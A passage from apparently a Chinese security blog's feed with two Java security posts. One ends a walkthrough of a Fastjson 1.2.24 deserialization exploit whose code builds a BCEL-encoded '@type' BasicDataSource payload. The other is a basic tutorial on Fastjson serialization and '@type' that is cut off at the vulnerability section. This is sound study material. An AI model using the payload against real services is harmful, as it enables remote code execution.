&#x27;calc.class&#x27; 字节码的字节数组；true表示编码过程中进行分割  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(),<span class="literal">true</span>);  </span><br><span class="line">        System.out.println(<span class="string">&quot;$$BCEL$$&quot;</span>+code);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        BasicDataSource dataSource = new BasicDataSource();  </span></span><br><span class="line"><span class="comment">//        dataSource.setDriverClassLoader(new ClassLoader());  </span></span><br><span class="line"><span class="comment">//        dataSource.setDriverClassName(&quot;$$BCEL$$&quot;+code);  </span></span><br><span class="line"><span class="comment">//        dataSource.getConnection();  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//driverClassLoader需要传入的是ClassLoader对象所以也需要用@type形式引入  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span> +code +<span class="string">&quot;\&quot;,\&quot;driverClassLoader\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parseObject(s);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面一定要用<code>parseObject()</code>去反序列化，因为我们要调它的<code>getConnection()</code>为getter方法需要进入<code>toJSON()</code>方法中<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212142147.png" alt="image-20230821214212598"><br>这条链子在不出网的时候可以利用</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>JdbcRowSetImpl这条链一开始没打通搞得很烦，总的来说跟的不是很深，可能后面会来再看，另外感觉在Obsidian写了文章，然后利用Typora发博客图片处理真的麻烦，不知道有没有啥好办法</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Fastjson系列二——1.2.22-1.2.24反序列化漏洞 [ Mi1k7ea ]</a><br><a href="https://blog.csdn.net/NicolasZQ/article/details/130004281?spm=1001.2014.3001.5502">【两万字原创长文】完全零基础入门Fastjson系列漏洞（基础篇）_W01fh4cker的博客-CSDN博客</a><br><a href="https://drun1baby.top/2022/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8702-Fastjson-1-2-24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#2-EXP-%E6%9E%84%E9%80%A0">Java反序列化Fastjson篇02-Fastjson-1.2.24版本漏洞分析 | Drunkbaby’s Blog (drun1baby.top)</a><br><a href="https://blog.csdn.net/gamma_lab/article/details/123294137">红队漏洞研究-fastjsonBasicDataSource链分析_Gamma_lab的博客-CSDN博客</a><br><a href="https://www.freebuf.com/articles/web/373730.html">利用BCEL打fastjson直接burp回显getshell - FreeBuf网络安全行业门户</a></p><p><a href="https://www.bilibili.com/video/BV1pP411N726/?spm_id_from=333.788&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7">https://www.bilibili.com/video/BV1pP411N726/?spm_id_from=333.788&amp;vd_source=fdbccecc8d1a39a2449860e47c52b6e7</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化之Fastjson入门篇</title>
      <link href="/undefined/20117.html"/>
      <url>/undefined/20117.html</url>
      
        <content type="html"><![CDATA[<h2 id="FastJson简介"><a href="#FastJson简介" class="headerlink" title="FastJson简介"></a>FastJson简介</h2><p>Fastjson 是 Alibaba 开发的 Java 语言编写的高性能 JSON 库，以其特有的算法，号称最快的json库，用于将数据在 JSON 和 Java Object 之间互相转换。<br>提供两个主要接口来分别实现序列化和反序列化操作。<br><code>JSON.toJSONString</code> 将 Java 对象转换为 json 对象，序列化的过程。<br><code>JSON.parseObject/JSON.parse</code> 将 json 对象重新变回 Java 对象；反序列化的过程</p><h2 id="通过代码简单了解"><a href="#通过代码简单了解" class="headerlink" title="通过代码简单了解"></a>通过代码简单了解</h2><p>首先导入依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">1.2</span><span class="number">.24</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>然后定义个Student类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是序列化的代码，调用 <code>JSON.toJsonString()</code> 来序列化 Student 类的对象 ：<br>StudentSerialize.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentSerialize</span> &#123;  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;  </span><br><span class="line">                <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();  </span><br><span class="line">                student.setName(<span class="string">&quot;y0n3er&quot;</span>);  </span><br><span class="line">                student.setAge(<span class="number">6</span>);  </span><br><span class="line">                <span class="type">String</span> <span class="variable">jsonstring</span> <span class="operator">=</span> JSON.toJSONString(student, SerializerFeature.WriteClassName);  </span><br><span class="line">                System.out.println(jsonstring);  </span><br><span class="line">        &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里跟一下序列化的过程，在<code>toJSONString()</code>方法那里下个断点，跟进来到JSON类下的<code>toJSONString()</code>方法下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308082232163.png" alt="image-20230808223154139"><br>在这里多出了个 static 的变量，写着 “members of JSON”，这里要特别注意一个值 <code>DEFAULT_TYPE_KEY</code> 为 “@type”，这个挺重要的，然后就是一些初始值赋值给out，这个out作为后续<code>JSONSerializer</code>构造函数的参数，看大佬说这一步走完其实就已经完成了序列化，但是我感觉是走完了<code>serializer.write(object);</code>这里完成序列化，也不太清楚<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308082232622.png" alt="image-20230808223233965"><br>然后就是到<code>toString()</code>这里序列化的数据进行显示<br>这里分析一下下面这条语句参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(student, SerializerFeature.WriteClassName);</span><br></pre></td></tr></table></figure><p>第一个参数是 student，是一个对象，就不多说了；<br>第二个参数是 <code>SerializerFeature.WriteClassName</code>，是 <code>JSON.toJSONString()</code> 中的一个设置属性值，设置之后在序列化的时候会多写入一个@type，即写上被序列化的类名，type 可以指定反序列化的类，并且调用其 <code>getter</code>&#x2F;<code>setter</code>&#x2F;<code>is</code> 方法。</p><ul><li>Fastjson 接受的 JSON 可以通过@type字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作。<br>输出如下：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置了SerializerFeature.WriteClassName</span></span><br><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">setAge</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Dome.Student&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">6</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;y0n3er&quot;</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 未设置SerializerFeature.WriteClassName</span></span><br><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">setAge</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">6</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;y0n3er&quot;</span>&#125;</span><br></pre></td></tr></table></figure><strong>反序列化代码</strong><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentUnserialize</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Dome.Student\&quot;,\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;y0n3er\&quot;&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> JSON.parseObject(jsonString, Student.class, Feature.SupportNonPublicField);  </span><br><span class="line">        System.out.println(student);  </span><br><span class="line">        System.out.println(student.getClass().getName());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308082233527.png" alt="image-20230808223321061"><br>简单的代码分析结束，稍微了解下过程</li></ul><h2 id="另外一些基础知识"><a href="#另外一些基础知识" class="headerlink" title="另外一些基础知识"></a>另外一些基础知识</h2><p>感觉这里就是对后续漏洞理解做个基础铺垫</p><h3 id="1-反序列化时的-Feature-SupportNonPublicField-参数"><a href="#1-反序列化时的-Feature-SupportNonPublicField-参数" class="headerlink" title="1. 反序列化时的 Feature.SupportNonPublicField 参数"></a>1. 反序列化时的 Feature.SupportNonPublicField 参数</h3><p>前文我们在反序列化代码运行的时候，发现我们并不能获取到 “age” 这个值，因为它是私有属性的。</p><ul><li>如果要还原出 private 的属性的话，还需要在JSON.parseObject&#x2F;JSON.parse中加上Feature.SupportNonPublicField参数。</li></ul><p>这里改下Student类，将私有属性age的setAge()函数注释掉（一般没人会给私有属性加setter方法，加了就没必要声明为private了）然后修改<code>StudentUnserialize.java</code>去掉Feature.SupportNonPublicField，添加输出两个属性<code>getter</code>方法的返回值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentUnserialize</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Dome.Student\&quot;,\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;y0n3er\&quot;&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> JSON.parseObject(jsonString, Student.class);  </span><br><span class="line">        System.out.println(student);  </span><br><span class="line">        System.out.println(student.getClass().getName());  </span><br><span class="line">        System.out.println(student.getName() + <span class="string">&quot; &quot;</span> + student.getAge());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新运行，会看到获取不到私有变量age的值而是被设置为0：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setName</span><br><span class="line">Dome.Student@28c97a5</span><br><span class="line">Dome.Student</span><br><span class="line">getName</span><br><span class="line">getAge</span><br><span class="line">y0n3er 0</span><br></pre></td></tr></table></figure><p>接着添加Feature.SupportNonPublicField：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> JSON.parseObject(jsonString, Student.class,Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure><p>再输出就能成功还原出age这个私有变量的值了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setName</span><br><span class="line">Dome.Student@28c97a5</span><br><span class="line">Dome.Student</span><br><span class="line">getName</span><br><span class="line">getAge</span><br><span class="line">y0n3er 6</span><br></pre></td></tr></table></figure><p>也就是说，若想让传给JSON.parseObject()进行反序列化的JSON内容指向的对象类中的私有变量成功还原出来，则需要在调用JSON.parseObject()时加上Feature.SupportNonPublicField这个属性设置才行。</p><h3 id="2-只进行-JSON-parseObject-jsonString"><a href="#2-只进行-JSON-parseObject-jsonString" class="headerlink" title="2. 只进行 JSON.parseObject(jsonString)"></a>2. 只进行 JSON.parseObject(jsonString)</h3><p>再来看下parseObject()的指定或不指定反序列化类型之间的差异。</p><p>由于Fastjson反序列化漏洞的利用只和包含了@type的JSON数据有关，因此这里我们只对序列化时设置了SerializerFeature.WriteClassName即含有@type指定反序列化类型的JSON数据进行反序列化；对于未包含@type的情况这里不做探讨，可自行测试。<br>关于这个@type的作用在白日梦组长视频下面看到个评论感觉挺形象的</p><blockquote><p>为什么要引入type属性？比如，张三工资3000，另一个叫张三的工资20000，他们都有一个类，叫人类，现在老板要招工人了，你是猎头，你把两个人信息都报上去了，也就是序列化传过去了，但是你反序列化的时候，发现两个人都叫张三，那么哪个是3000工资的，哪个是20000工资的呢，这时候就会乱，所以引入了原始属性，也就是@type，这样就能找到归属，原来1米5的张三工资是3000，1米9的张三工资是20000，但是呢，这个@type属性可以随意填写，没想到工资3000的张三上面有人，给他写了个@type：我爹是李刚，故此1米5的张三拿着10000000000000的工资入职了。</p></blockquote><p>总结就是用@type给你指定调用哪个类下的 <code>setter</code> 方法和 <code>getter</code> 方法<br>修改Student类，添加两个private成员变量，且所有的私有成员变量都不定义setter方法（既然是private也没必要定义）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.util.Properties;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">private</span> String address;  </span><br><span class="line">    <span class="keyword">private</span> Properties properties;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAddress</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAddress&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> address;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title function_">getProperties</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getProperties&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> properties;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改反序列化StudentUnserialize文件，先是默认调用parseObject()不带指定类型的参数：也就是只有 <code>JSON.parseObject(jsonstring)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentUnserialize2</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Dome.Student\&quot;,\&quot;age\&quot;:6,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;name\&quot;:\&quot;Drunkbaby\&quot;,\&quot;address\&quot;:\&quot;china\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString);  </span><br><span class="line">        <span class="comment">// 或以下语句，输出结果一致  </span></span><br><span class="line">        <span class="comment">//JSONObject obj = JSON.parseObject(jsonString);  </span></span><br><span class="line">        System.out.println(obj);  </span><br><span class="line">        System.out.println(obj.getClass().getName());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出看到，调用了Student类的构造函数、所有属性的getter方法、JSON里面非私有属性的setter方法，其中getProperties()调用了两次；无论定义的对象是Object还是JSONObject，最后反序列化得到的都是JSONObject类对象，可以看到是未反序列化成功的：<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308082234896.png" alt="image-20230808223413064"><br>接着在StudentUnserialize2.java中修改反序列化代码语句如下，加上指定反序列化得到的类型为Object.class或Student.class，这样就是成功反序列化的回显。<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091125832.png" alt="image-20230809112543959"></p><h3 id="3-parse与parseObject区别"><a href="#3-parse与parseObject区别" class="headerlink" title="3. parse与parseObject区别"></a>3. parse与parseObject区别</h3><p>前面的demo都是用<code>parseObject()</code>演示的，还没说到<code>parse()</code>。两者主要的区别就是<code>parseObject()</code>返回的是JSONObject而<code>parse()</code>返回的是实际类型的对象，当在没有对应类的定义的情况下，一般情况下都会使用<code>JSON.parseObject()</code>来获取数据。</p><blockquote><p>FastJson中的 <code>parse()</code> 和 <code>parseObject()</code> 方法都可以用来将JSON字符串反序列化成Java对象，<code>parseObject()</code> 本质上也是调用 <code>parse()</code> 进行反序列化的。但是 <code>parseObject()</code> 会额外的将Java对象转为 JSONObject对象，即 <code>JSON.toJSON()</code>。所以进行反序列化时的细节区别在于，<code>parse()</code> 会识别并调用目标类的 <code>setter</code> 方法及某些特定条件的 <code>getter</code> 方法，而 <code>parseObject()</code> 由于多执行了 <code>JSON.toJSON(obj)</code>，所以在处理过程中会调用反序列化目标类的所有 <code>setter</code> 和 <code>getter</code> 方法。</p></blockquote><p>也就是说，我们用<code>parse()</code>反序列化会直接得到特定的类，而无需像<code>parseObject()</code>一样返回的是JSONObject类型的对象、还可能需要去设置第二个参数指定返回特定的类。</p><p>修改反序列化语句中的<code>parseObject()</code>为<code>parse()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Dome;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentUnserialize3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Dome.Student\&quot;,\&quot;age\&quot;:6,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;name\&quot;:\&quot;y0n3er\&quot;,\&quot;address\&quot;:\&quot;china\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parse(jsonString, Feature.SupportNonPublicField);  </span><br><span class="line">        System.out.println(obj);  </span><br><span class="line">        System.out.println(obj.getClass().getName());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308091126302.png" alt="image-20230809112621604"></p><h3 id="4-简单总结"><a href="#4-简单总结" class="headerlink" title="4. 简单总结"></a>4. 简单总结</h3><p>简单总结上面的就是反序列化的语句应该这么写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:6,&quot;</span> +  </span><br><span class="line">        <span class="string">&quot;\&quot;name\&quot;:\&quot;y0n3er\&quot;,\&quot;address\&quot;:\&quot;china\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;  </span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString, Student.class);</span><br></pre></td></tr></table></figure><p>要用 <code>parseObject</code>，里面的参数需要是 <code>Object.class</code></p><h2 id="fastjson-反序列化漏洞原理"><a href="#fastjson-反序列化漏洞原理" class="headerlink" title="fastjson 反序列化漏洞原理"></a>fastjson 反序列化漏洞原理</h2><p>这里还是上面的那个总结，我用@type给你指定你在反序列化的时候自动调用哪个类下的 <code>setter</code> 与 <code>getter</code> 方法，当然这里并不是所有的 <code>setter</code> 和 <code>getter</code> 